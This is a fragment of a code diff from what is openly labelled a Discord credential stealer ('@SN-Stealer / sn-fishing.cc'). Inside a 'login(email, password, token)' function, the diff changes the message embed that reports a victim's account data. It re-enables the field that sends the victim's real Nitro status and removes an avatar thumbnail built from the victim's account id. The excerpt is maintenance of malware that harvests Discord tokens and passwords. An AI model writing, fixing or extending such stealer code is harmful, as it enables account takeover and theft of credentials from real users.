@@ -681,8 +681,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro Type:',
-//             value: `${nitro}`,
-               value: `*Soon...*`,
+             value: `${nitro}`,
             inline: true,
            },
           {
@@ -697,9 +696,6 @@ const login = async (email, password, token) => {
         },
         footer: {
           text: '@SN-Stealer / sn-fishing.cc',
-        },
-        thumbnail: {
-            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
         },
       },
     ],
